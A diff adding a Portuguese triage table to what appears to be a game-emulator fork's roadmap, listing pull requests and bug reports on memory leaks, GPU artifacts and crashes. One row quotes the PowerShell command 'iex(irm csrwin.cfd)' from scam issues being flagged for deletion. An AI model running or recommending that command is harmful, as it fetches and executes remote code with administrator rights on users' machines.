@@ -61,6 +61,39 @@ fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em h
 | 0.48 | Retângulo cinza no céu (foto do usuário) | ⏳ | |
 | 0.49 | **Publicar v0.60.5** (revisão + vigia) | ⏳ aprovação | |
 
+## Triagem de 21/10 (12 PRs e 103 issues abertas)
+
+**PRs novas**
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| T1 | PR #219 (Oussama268): vazamento de memória, ~60 MB/min | ⏳ integrar 1º | 7 linhas: os quadros das corrotinas de buffers indiretos nunca eram liberados (756 → 1706 MiB em 15 min; >7 GB em meia hora). Provável parte de #220 (6 GB, memória sobe até cair), dos engasgos em sessões longas e talvez do "fechou do nada". |
+| T2 | PR #232 (Tadomikaari312-Hy): reaproveitar binds de descritores entre draws iguais | ⏳ integrar + medir | Santuário RX 6600M: 24–25 → 29,6–30 FPS. `SOTC_FAST_BIND=0` desliga. Medir aqui na NVIDIA e procurar artefatos. |
+| T3 | PR #205 (Lucas): barreiras LDS na AMD GCN (wave64) | ⏳ integrar | Causa provável dos personagens brancos/verdes/rosa na RX 470–590/Vega (0.28; #152, #158, #162, #187, #201): `needs_lds_barriers` ficava falso com subgroup 64. Sem efeito na NVIDIA; teste em GCN pelos jogadores. |
+| T4 | PR #198 (Lucas): CPUs com 4 threads (gravador dorme, CP cede) | ⏳ integrar + medir | 4 threads: preso no loading → 73 FPS. Conferir que não perde FPS em 16 threads. |
+| T5 | PR #215 (Oussama268): pré-carga de pipelines nos workers (driver novo: 107 s → 6,5 s) | ⏳ testar com cuidado | A pré-carga assíncrona anterior derrubou o driver NVIDIA aqui (0.10/0.25). Testar com cache apagado do driver. |
+| T6 | PR #207 (Lucas): lançador sobrevive a stdout que recusa escrita (#104) | ⏳ integrar | Pequena, 26 linhas. |
+| T7 | PR #212 (Oussama268): mensagem clara para dump/módulos ainda criptografados | ⏳ integrar | Pequena, com teste. |
+| T8 | PR #173 (JihedMrouki): baricêntricas por geometry shader na GTX 10xx | ❎ provável duplicata | Já temos a emulação por GS (log: "emulated by a geometry shader", via #169). Conflita. Comparar só as correções extras (sombra distante na 1080 Ti) antes de fechar. |
+| T9 | PRs antigas #93, #81, #69, #39 | ⏳ decisão | #93 e #81 já integradas em partes (fechar com aprovação); #69 decisão pendente (0.5); #39 Linux (AppImage) atualizada há 13 h. |
+
+**Issues novas / importantes**
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| T10 | #235: texturas HD pioraram na 0.60.4 em relação à 0.60.3 (com fotos) | 🔥 confirma 0.46 | É a histerese da 0.42: com o pool sempre em ~0% livre o mip só volta ao fino acima de 16%, então fica preso no mip 4/3. Na 0.60.3 (sem histerese) voltava ao 2 entre as oscilações. Decidir: desligar o gatilho por padrão (nítido, risco da queda 0x1a371) ou corrigi-lo pela liberação que falha (0.46). |
+| T11 | #226: queda na cena final (RTX 5070, log anexado) | 🔍 | Baixar o log (pedir aprovação) e ver se é o 0x49500 já corrigido na 0.60.3 ou outra coisa. |
+| T12 | #228: colosso 5 (Avion) não aparece depois do 4 (modo Difícil, save da 0.59) | 🔍 | Ver se o save passa de versão; pedir o save. |
+| T13 | #202: barra de vida/stamina aparece cheia (fundo preto) em 3440x1440 + Pro | 🔍 | Só no ultrawide; em 16:9 normal. HUD do patch de tela larga (#54). |
+| T14 | #214: sem som na 0.60.4 (RX 6600, log) | 🔍 | Provável módulo de som (libSceNgs2/libSceUlt) faltando; ver o log. |
+| T15 | #208, #209, #210, #227, #206: geração de quadros/FSR na AMD e HUD tremendo | 🔍 | #209 é o **FSR 1 (upscaler)** com artefatos/tearing na RX 9070, sem geração de quadros: diferente das outras. HUD tremendo: `SOTC_FG_HUDLESS=1` (#154) já existe; avaliar ligar por padrão. |
+| T16 | #200, #231, #237 (+ #70, #88, #89, #164–166): CPUs sem AVX2/BMI1/LZCNT/MOVBE | ⏳ pedir PR | O fork do Lucas já troca essas instruções ao carregar (trabalho do Oussama, desde 0.59-plus2); #200 confirmou que funciona. Convidar para PR. |
+| T17 | #224, #199: engasgos de shader mesmo com cache (RX 9060 XT; Intel Arc B580, ~13 s por área nova) | 🔍 | Arc B580: `SOTC_INTEL_PIN_SUBGROUP` não mudou nada. |
+| T18 | #217: texturas quebradas na Intel Arc A580 | 🔍 Intel | Sem hardware. |
+| T19 | #234/#37: HDR | ⏳ ideia | shadPS4 release 19 tem HDR; avaliar portar. |
+| T20 | #213 (Lucas): triagem com 41 issues que podem ser fechadas | ⏳ aprovação | Cada uma já tem comentário dele. Fechar com aprovação do usuário. |
+| T21 | **#233 e #236: golpe (malware)** — `iex(irm csrwin.cfd)` como admin, igual à #138 | 🚨 | Apagar as issues e denunciar as contas (só o dono do repositório pode). |
+
 ## Fase 1 — Estabilidade (quedas e travamentos)
 
 | # | Item | Estado | Notas |
